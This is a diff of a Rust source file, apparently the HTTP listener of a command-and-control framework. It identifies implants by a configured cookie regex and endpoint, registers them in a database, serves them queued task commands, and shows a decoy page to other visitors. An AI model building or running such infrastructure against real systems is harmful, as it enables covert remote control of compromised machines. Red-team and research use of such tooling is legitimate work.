@@ -1,21 +1,18 @@
-extern crate regex;
-
+use httparse::{self, Header, Status, Error, Response};
 use lazy_static::lazy_static;
-use std::fs;
-use std::path::Path;
-use std::string::FromUtf8Error;
+use regex;
+use regex::bytes::Regex;
 use std::sync::mpsc::{Receiver, TryRecvError};
 use std::thread;
 use std::time;
-use regex::bytes::{Captures, Match, Regex};
 use std::io;
 use std::io::prelude::*;
 use std::net::{TcpListener, TcpStream};
 
-use crate::models::{ListenerSignal, ImplantTaskStatus};
-use crate::models::ListenerStatus;
+use crate::models::{ListenerSignal, ImplantTaskStatus, ListenerStatus, ImplantConnectionType};
 use crate::settings;
 use crate::database;
+use crate::utils;
 
 lazy_static!
 {
@@ -25,82 +22,145 @@ lazy_static!
 
 fn handle_connection(mut stream: TcpStream, listener_id: u16)
 {
-    // Read the first 1024 bytes of data from the stream
-    let mut buffer: [u8; 1024] = [0; 1024];
-    stream.read(&mut buffer).unwrap();
+    let mut http_request_bytes: Vec<u8> = Vec::new();
+    let mut is_implant: bool = false;
+    let mut implant_connection_type: ImplantConnectionType = ImplantConnectionType::Pull;
+    let mut implant_auth_cookie: String = String::new();
+    let http_method: String;
+    let http_path: String;
 
-    let (is_implant, implant_auth_cookie) = check_if_implant(buffer);
-    let (mut http_response_headers, response_body_page_path) = prepare_http_response(buffer, is_implant);
-
-    let mut http_response_body = if Path::new(&response_body_page_path).exists()
+    loop
     {
-        match fs::read(response_body_page_path)
+        let mut buffer: [u8; 1024] = [0; 1024];
+        match stream.read(&mut buffer)
         {
-            Ok(v) => v,
-            Err(_) => vec![]
-        }
-    }
-    else {
-        vec![]
-    };
-
-    if is_implant
-    {
-        if ! database::check_if_implant_exists(None, Some(&implant_auth_cookie))
-        {
-            println!("\n[+] Adding to database implant with hash: {}", &implant_auth_cookie);
-
-            if database::add_implant(listener_id, &implant_auth_cookie)
+            Ok(v) => 
             {
-                println!("[+] Implant successfully added to the database");
-            }
-            else
-            {
-                println!("[!] Failed to add the implant to the database");
-            }
-        }
-        else
-        {
-            if ! database::update_implant_timestamp(&implant_auth_cookie)
-            {
-                println!("[!] Couldn't update the timestamp of the implant with this cookie");
-                println!("\t{}", &implant_auth_cookie);
-            }
-
-            let mut include_statuses: Vec<String> = Vec::new();
-            include_statuses.push(ImplantTaskStatus::Issued.to_string());
-
-            let implant_tasks = database::get_implant_tasks("CookieHash", &implant_auth_cookie, include_statuses);
-            
-            if implant_tasks.len() == 0
-            {
-                http_response_headers = "HTTP/1.1 404 Not Found\r\n\r\n".to_string();
-            }
-            else
-            {
-                for task in implant_tasks
+                if v == 0
                 {
-                    http_response_body = prepare_http_response_task_command(task.command);
-                    
-                    if ! database::update_implant_task_status(
-                        task.id, 
-                        ImplantTaskStatus::Pending
-                    )
-                    {
-                        println!("[!] Couldn't update the status of the task");
-                    }
-
                     break;
                 }
-            }
+                else
+                {
+                    http_request_bytes.extend_from_slice(&buffer);
+                }
+            },
+            Err(_) => break
         }
     }
+
+    let regex_double_crlf = Regex::new(r"\r\n\r\n").unwrap();
+    let mut double_crlf_offset: usize = http_request_bytes.len() - 1;
+    match regex_double_crlf.find(&http_request_bytes)
+    {
+        Some(m) => {
+            double_crlf_offset = m.start()
+        },
+        None => {}
+    }
+
+    let re = Regex::new(r"\r\n").unwrap();
+    let num_http_headers = re.find_iter(&http_request_bytes[0..double_crlf_offset]).count();
+    let mut http_headers: Vec<httparse::Header> = vec![
+        Header {name: "", value: &[]};
+        num_http_headers
+    ];
+    
+    let mut req = httparse::Request::new(&mut http_headers);
+    let res: Result<Status<usize>, Error> = req.parse(&http_request_bytes);
+
+    if res.is_err()
+    {
+        println!("[!] Error parsing the HTTP request");
+        return;
+    }
+
+    if req.method.is_some() && req.path.is_some()
+    {
+
+        http_method = req.method.unwrap().to_string();
+        http_path = req.path.unwrap().to_string();
+
+        // now that we know the method and the path, we must check
+        // the auth. cookie to determine if it's an implant
+
+        let regex_string = &CONFIG.listener.http.auth_cookie_regex;    
+        match Regex::new(regex_string.as_str())
+        {
+            Ok(re) => {
+                match re.captures(&http_request_bytes) {
+                    Some(caps) =>
+                    {
+                        match caps.get(1)
+                        {
+                            Some(capture_match) => {
+                                let cookie: Vec<u8> = http_request_bytes[
+                                    capture_match.start()..capture_match.end()
+                                ].to_vec();
+
+                                match String::from_utf8(cookie)
+                                {
+                                    Ok(cookie_str) => {
+                                        if http_method == CONFIG.listener.http.pull_method &&
+                                            http_path == CONFIG.listener.http.pull_endpoint
+                                        {
+                                            implant_auth_cookie = cookie_str;
+                                            implant_connection_type = ImplantConnectionType::Pull;
+                                            is_implant = true;
+                                        }
+                                        else if http_method == CONFIG.listener.http.push_method &&
+                                            http_path == CONFIG.listener.http.push_endpoint
+                                        {
+                                            implant_auth_cookie = cookie_str;
+                                            implant_connection_type = ImplantConnectionType::Push;
+                                            is_implant = true;
+                                        }
+                                    },
+                                    Err(_) => {}
+                                }
+                            },
+                            None => {}
+                        }
+                    },
+                    None => {}
+                }
+            },
+            Err(_) => {
+                println!("[!] The regex you specified in the configuration (for the HTTP listener) isn't valid");
+                return;
+            }
+        }
+
+    }
+    else
+    {
+        // couldn't parse the HTTP request, there's something wrong going on
+        return;
+    }
+
+    let http_response_bytes: Vec<u8> = if is_implant
+    {
+        prepare_http_response_implant(listener_id, implant_connection_type, implant_auth_cookie)
+    }
+    else
+    {
+        prepare_http_response(http_method, http_path)
+    };
 
     // Write response back to the stream,
     // and flush the stream to ensure the response is sent back to the client
-    stream.write_all(http_response_headers.as_bytes()).unwrap();
-    stream.write_all(&http_response_body).unwrap();
-    stream.flush().unwrap();
+    match stream.write_all(&http_response_bytes)
+    {
+        Ok(_) => {
+            if stream.flush().is_err()
+            {
+                println!("[!] Error flushing the stream");
+            }
+        },
+        Err(_) => {
+            println!("[!] Error sending the HTTP response bytes to the client");
+        }
+    }
 }
 
 pub fn start_listener(listener_id: u16, rx: Receiver<ListenerSignal>)
@@ -169,77 +229,165 @@ pub fn start_listener(listener_id: u16, rx: Receiver<ListenerSignal>)
 }
 
 fn prepare_http_response(
-    buffer: [u8; 1024],
-    is_implant: bool
-) -> (String, String)
+    http_method: String,
+    http_path: String
+) -> Vec<u8>
 {
-    let get: &[u8; 6] = b"GET / ";
-
-    let page_path: String = (&CONFIG.listener.http.default_page_path).to_string();
+    let default_page_path: String = (&CONFIG.listener.http.default_page_path).to_string();
     let error_page_path: String = (&CONFIG.listener.http.default_error_page_path).to_string();
-    let ok_response_code: String = "HTTP/1.1 200 OK\r\n\r\n".to_string();
-    let not_found_response_code: String = "HTTP/1.1 404 Not Found\r\n\r\n".to_string();
 
-    if is_implant
-    {
-        return (ok_response_code, String::new());
-    }
+    let mut http_response: Response = httparse::Response::new(&mut []);
+    let _http_response_headers: Vec<Header> = Vec::new();
 
-    if buffer.starts_with(get)
+    if http_method == "GET" && http_path == "/"
     {
-        return (ok_response_code, page_path);
+        http_response.code = Some(200);
+        http_response.version = Some(1);
+        http_response.reason = Some("OK");
+
+        write_http_response_bytes(
+            http_response,
+            utils::read_file_bytes(&default_page_path)
+        )
     }
     else {
-        return (not_found_response_code, error_page_path);
-    };
-}
+        http_response.code = Some(404);
+        http_response.version = Some(1);
+        http_response.reason = Some("Not Found");
 
-fn check_if_implant(buffer: [u8; 1024]) -> (bool, String)
-{
-    let implant_pull_request = format!(
-        "{} /{} HTTP/",
-        &CONFIG.listener.http.pull_method,
-        &CONFIG.listener.http.pull_endpoint,
-    );
-
-    let implant_push_request = format!(
-        "{} /{} HTTP/",
-        &CONFIG.listener.http.push_method,
-        &CONFIG.listener.http.push_endpoint,
-    );
-
-    let mut implant_auth_cookie: String = String::new();
-
-    let is_implant: bool = buffer.starts_with(implant_push_request.as_bytes()) || buffer.starts_with(implant_pull_request.as_bytes());
-
-    if is_implant
-    {
-        let regex_string = &CONFIG.listener.http.auth_cookie_regex;    
-        let re = Regex::new(regex_string.as_str()).unwrap();
-        let caps: Option<Captures> = re.captures(&buffer);
-
-        if caps.is_some()
-        {
-            let capture_match: Option<Match> = caps.unwrap().get(1);
-            if capture_match.is_some()
-            {
-                let cookie_indexes: Match = capture_match.unwrap();
-                let cookie: Vec<u8> = buffer[cookie_indexes.start()..cookie_indexes.end()].to_vec();
-                let cookie_str: Result<String, FromUtf8Error> = String::from_utf8(cookie);
-
-                if cookie_str.is_ok()
-                {
-                    implant_auth_cookie = cookie_str.unwrap();
-                }
-            }
-        }
+        write_http_response_bytes(
+            http_response,
+            utils::read_file_bytes(&error_page_path)
+        )
     }
-
-    return (is_implant, implant_auth_cookie);
 }
 
 fn prepare_http_response_task_command(task_command: String) -> Vec<u8>
 {
     let http_response_bytes: Vec<u8> = task_command.as_bytes().to_vec();
     return http_response_bytes;
+}
+
+fn prepare_http_response_implant(
+    listener_id: u16,
+    implant_connection_type: ImplantConnectionType,
+    implant_auth_cookie: String
+) -> Vec<u8>
+{
+    let mut http_response: Response = httparse::Response::new(&mut []);
+    let _http_response_headers: Vec<Header> = Vec::new();
+    let mut http_response_body: Vec<u8> = Vec::new();
+    let http_response_bytes: Vec<u8> = Vec::new();
+
+    match implant_connection_type
+    {
+        ImplantConnectionType::Pull => {
+            if ! database::check_if_implant_exists(None, Some(&implant_auth_cookie))
+            {
+                println!("\n[+] Adding to database implant with hash: {}", &implant_auth_cookie);
+    
+                if database::add_implant(listener_id, &implant_auth_cookie)
+                {
+                    println!("[+] Implant successfully added to the database");
+                    
+                    http_response.code = Some(200);
+                    http_response.version = Some(1);
+                    http_response.reason = Some("OK");
+                }
+                else
+                {
+                    println!("[!] Failed to add the implant to the database");
+                }
+            }
+            else
+            {
+                if ! database::update_implant_timestamp(&implant_auth_cookie)
+                {
+                    println!("[!] Couldn't update the timestamp of the implant with this cookie");
+                    println!("\t{}", &implant_auth_cookie);
+                }
+    
+                let mut include_statuses: Vec<String> = Vec::new();
+                include_statuses.push(ImplantTaskStatus::Issued.to_string());
+    
+                let implant_tasks = database::get_implant_tasks("CookieHash", &implant_auth_cookie, include_statuses);
+
+                if implant_tasks.len() == 0
+                {
+                    http_response.code = Some(404);
+                    http_response.version = Some(1);
+                    http_response.reason = Some("Not Found");
+                }
+                else
+                {
+                    for task in implant_tasks
+                    {
+                        
+                        if ! database::update_implant_task_status(
+                            task.id, 
+                            ImplantTaskStatus::Pending
+                        )
+                        {
+                            println!("[!] Couldn't update the status of the task");
+                            
+                            // since we failed to update the status of the task, we
+                            // can't send it to the implant
+                            // so just assume that there are no tasks
+                            http_response.code = Some(404);
+                            http_response.version = Some(1);
+                            http_response.reason = Some("Not Found");
+
+                            break;
+                        }
+                        else
+                        {
+                            http_response.code = Some(200);
+                            http_response.version = Some(1);
+                            http_response.reason = Some("OK");
+                            http_response_body = prepare_http_response_task_command(task.command);
+
+                            break;
+                        }
+                    }
+                }
+            }
+
+            // return the http response bytes
+            return write_http_response_bytes(
+                http_response,
+                http_response_body
+            );
+            
+        },
+        ImplantConnectionType::Push => {
+
+        }
+    }
+
+    return http_response_bytes;
+}
+
+// https://github.com/vi/http-bytes/blob/master/src/lib.rs
+pub fn write_http_response_bytes(
+    http_response: httparse::Response,
+    http_response_body_bytes: Vec<u8>
+) -> Vec<u8>
+{
+    let code = http_response.code.unwrap();
+    let reason = http_response.reason.unwrap();
+    let headers = http_response.headers;
+    let mut output_vector: Vec<u8> = Vec::new();
+
+    output_vector.extend_from_slice(format!("HTTP/1.1 {} {}\r\n", code, reason).as_bytes());
+
+    for header in headers {
+        output_vector.extend_from_slice(format!("{}: ", header.name).as_bytes());
+        output_vector.extend_from_slice(header.value);
+        output_vector.extend_from_slice(b"\r\n");
+    }
+
+    output_vector.extend_from_slice(b"\r\n");
+    output_vector.extend_from_slice(http_response_body_bytes.as_slice());
+    
+    return output_vector;
 }
